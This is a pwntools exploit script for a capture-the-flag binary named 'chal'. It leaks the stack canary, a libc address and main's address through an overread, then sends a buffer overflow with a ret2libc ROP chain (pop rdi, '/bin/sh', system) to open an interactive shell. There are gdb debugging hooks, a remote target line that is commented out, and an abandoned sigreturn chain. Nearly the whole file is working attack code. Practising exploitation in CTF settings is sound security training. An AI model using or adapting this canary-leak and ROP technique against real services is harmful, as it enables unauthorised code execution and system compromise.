from pwn import *

# ./src/release/share/chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2c554f507cbcbb68621614d75e68848a3493ddf6, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

context.arch = 'amd64'
context.os == "linux"
context.terminal = ["tmux", "splitw", "-h"]

# port = 10056
# p = remote('10.113.184.121', port)
p = process('./src/release/share/chal')

# ./src/release/share/chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1be59a1ccee21f046abe47235de19feebe806c9d, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# linux-vdso.so.1 (0x00007ffe787c8000)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbaa6800000)
# /lib64/ld-linux-x86-64.so.2 (0x00007fbaa6bb5000)

# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi

# 0x000000000002a745 : pop rdi ; pop rbp ; ret
# 0x000000000002a3e5 : pop rdi ; ret

#
# 0x000000000000101a : ret

gdbscript = 'gef\ngef\n'
gdbscript += 'set follow-fork-mode child\n'
gdbscript += 'p &n\n'
gdbscript += 'p &msg\n'
gdbscript += 'p &n2\n'

_pid = gdb.attach(
    p,
    gdbscript=gdbscript,
)

# %%

p.sendafter(b"Haaton's name? ", b"A" * 20)
a = p.recvline()
print(a)

# the n2 now will be change from 0x30 to 0x61 (aka. 'a', the last char of the strcat)

a = p.recvline()
print(a)

payload = b"HACHAMA\0" + b"A"
print(f"{len(payload) = }")
print(f"{payload = }")
print()

p.send(payload)

a = p.recv()

_len = 0x30

print(f"{len(a) = }")
print(f"{a = }")
print()

# %%

magic_addr = u64(a[0x20:0x20 + 0x8])

canary = u64(a[_len + 0x8 * 1:_len + 0x8 * 2])

ret = 0x000000000000101a

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 0x7fcbdae29d90 - 0x00007fcbdae00000 = 0x29d90
libc_offset = 0x29d90
libc_addr = u64(a[_len + 0x8 * 3:_len + 0x8 * 4])
libc_base = libc_addr - libc_offset

system_addr = libc_base + libc.symbols['system']
sigemptyset_addr = libc_base + libc.symbols['sigemptyset']
sigreturn_addr = libc_base + libc.symbols['sigreturn']
open_addr = libc_base + libc.symbols['open']
read_addr = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']

binsh_addr = libc_base + list(libc.search(b'/bin/sh'))[0]

libc_pop_rdi = libc_base + 0x000000000002a3e5

# libc_one_gadget = libc_base + 0xebc81
# # maybe_script_execute (), reason: SIGBUS
# # Program terminated with signal SIGSYS, Bad system call.
# # 0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43

main_addr = u64(a[_len + 0x8 * 5:_len + 0x8 * 6])

main_read = main_addr + 0x145e - 0x1331

print(f"{hex(magic_addr) = }")
print(f"{hex(canary) = }")
print(f"{hex(libc_base) = }")
print(f"{hex(system_addr) = }")
print(f"{hex(binsh_addr) = }")
print(f"{hex(main_addr) = }")
print()

raw_input()

# %%
# # b'/home/chal/flag.txt'

# rop_chain = flat([
#     # #
#     # libc_pop_rdi,
#     # 0,
#     #
#     sigreturn_addr,
# ])
# payload = (b"HACHAMA\0" + b"A").ljust(
#     0x38, b'a') + p64(canary) + b'a' * 0x8 + rop_chain
# # payload = b'a' * 0x38 + p64(canary) + p64(magic_addr) + rop_chain

# print(f"{len(payload) = }")
# print(f"{payload = }")
# p.send(payload)

# a = p.recv()

# _len = 0x30

# print(f"{len(a) = }")
# print(f"{a = }")
# print()

rop_chain = flat([
    #
    libc_pop_rdi,
    binsh_addr,
    #
    system_addr,
])
payload = b'a' * 0x38 + p64(canary) + p64(magic_addr) + rop_chain

print(f"{len(payload) = }")
print(f"{payload = }")
p.send(payload)

raw_input()

p.interactive()

# %%
